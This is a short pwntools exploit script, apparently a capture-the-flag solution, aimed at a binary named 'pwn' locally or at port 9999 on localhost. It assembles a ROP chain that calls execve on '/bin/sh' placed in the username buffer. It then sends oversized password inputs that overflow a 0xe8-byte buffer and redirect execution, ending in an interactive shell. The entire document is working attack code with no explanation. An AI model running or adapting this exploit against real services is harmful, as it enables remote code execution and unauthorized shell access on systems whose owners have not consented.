from pwn import *
context(
    terminal = ['tmux','splitw','-h'],
    os = "linux",
    arch = "amd64",
    log_level="debug",
)
def debug(io):
    gdb.attach(io,
'''
b Password
'''
)
    
def getio():
    if sys.argv[1] == 'local':
        return process("./pwn")
    elif sys.argv[1] == 'remote':
        return remote("127.0.0.1", 9999)

io = getio()
# debug(io)

elf = ELF("pwn")
gadgets = ROP(elf)

syscall = 0x41947f
rax = gadgets.rax.address
rdi = gadgets.rdi.address
rsi = gadgets.rsi.address
rdx = gadgets.rdx.address

username = 0x4aba58
flag_adr = username + 0xE0
sh_adr = username + 0x50

rop = b''
rop+= p64(rax) + p64(0x3B) + p64(rdi) + p64(sh_adr) + p64(rsi) + p64(0x0) + p64(rdx) + p64(0x0) + p64(syscall)

io.sendafter(b'username\n', rop + b'/bin/sh\x0a')
io.sendafter(b'password\n', b'a'*0xe8 + b'\xff')
io.sendafter(b'password\n', b'a'*0xe8 + p64(0xff) + p64(username)[0:6] + b'\x0a')

io.interactive()
